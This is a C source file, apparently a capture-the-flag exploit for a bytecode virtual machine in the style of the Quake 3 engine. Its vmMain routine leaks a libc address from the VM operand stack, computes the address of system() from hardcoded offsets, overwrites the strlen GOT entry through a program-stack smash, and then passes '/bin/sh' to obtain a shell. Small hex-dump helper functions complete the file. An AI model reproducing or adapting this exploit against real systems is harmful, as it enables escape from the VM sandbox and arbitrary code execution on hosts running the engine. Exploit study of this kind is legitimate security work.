// >>>>>>>>>>>>>>>>>>>> UTILITY METHOD DECLARATIONS <<<<<<<<<<<<<<<<<<<<

extern void print_str(const char*);

typedef struct {
    unsigned low, high;
} uint64_t;

uint64_t add_offset(uint64_t val, int off);

void intdump(unsigned val);
void longdump(uint64_t val);
void hexdump(const void *data, int len);

// >>>>>>>>>>>>>>>>>>>> MAIN EXPLOIT <<<<<<<<<<<<<<<<<<<<

static char filler[524288]; //~0.5MB -> get our own mmaped dataBase

const int LIBC_LEAK_OFF = 0x8d68;
const int LIBC_SYSTEM_OFF = 0x552b0;

extern void leak_opstack(char**);
extern int smash_progstack(int call_no);

int vmMain() {
    int i;
    char *leak_ptr;
    uint64_t libc_base, system_addr;

    //Leak the opstack
    leak_opstack(&leak_ptr);
    leak_ptr += 4;

    //Search for a libc leak in the opstack leak
    for(i = 0; i < 59; i++) {
        libc_base = ((uint64_t*) leak_ptr)[i];
        libc_base.low -= LIBC_LEAK_OFF;
        if(!(libc_base.low & 0xfff)) break;
    }

    print_str("libc base: ");
    longdump(libc_base);
    if(libc_base.low & 0xfff) {
        print_str("INCORRECT LIBC BASE ALIGN\n");
        return 1;
    }

    //Calculate the address of system(), and check if we can actually write it to memory
    system_addr = add_offset(libc_base, LIBC_SYSTEM_OFF);
    print_str("system: ");
    longdump(system_addr);

    if(-1 - (int) system_addr.low >= 0) {
        //Our system address doesn't correspond to a valid syscall number :/
        print_str("Bad ASLR luck - please try again :/\n");
        return 1;
    }

    //Use the progstack to smash the GOT entry for strlen
    print_str("Smashing the progstack; this should spawn a shell if all goes well! :)"); //this message most likely won't appear because of stdout buffering .-.
    smash_progstack(-1 - (int) system_addr.low);

    //This will trigger a call to strlen, which will execute system :)
    print_str("/bin/sh");

    return 0;
}

// >>>>>>>>>>>>>>>>>>>> UTILITY METHODS <<<<<<<<<<<<<<<<<<<<

uint64_t add_offset(uint64_t val, int off) {
    if(off < 0 && val.low < (unsigned) -off) val.high--;
    if(off > 0 && val.low > (unsigned) -off) val.high++;
    val.low += off;
    return val;
}

static const char *hex_lut[16] = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f" };

void intdump(unsigned v) {
    int i;
    print_str("0x");
    for(i = 7; i >= 0; i--) print_str(hex_lut[(v >> (i*4)) & 0xf]);
    print_str("\n");
}

void longdump(uint64_t v) {
    int i;
    print_str("0x");
    for(i = 7; i >= 0; i--) print_str(hex_lut[(v.high >> (i*4)) & 0xf]);
    for(i = 7; i >= 0; i--) print_str(hex_lut[(v.low >> (i*4)) & 0xf]);
    print_str("\n");
}

void hexdump(const void *data, int len) {
    int i;
    for(i = 0; i < len; i++) {
        print_str(hex_lut[((const unsigned char*) data)[i] >> 4]);
        print_str(hex_lut[((const unsigned char*) data)[i] & 0xf]);
        if(i % 8 == 7) print_str(" ");
        if(i % 16 == 15) print_str("\n");
    }
    if(len % 16) print_str("\n");
}
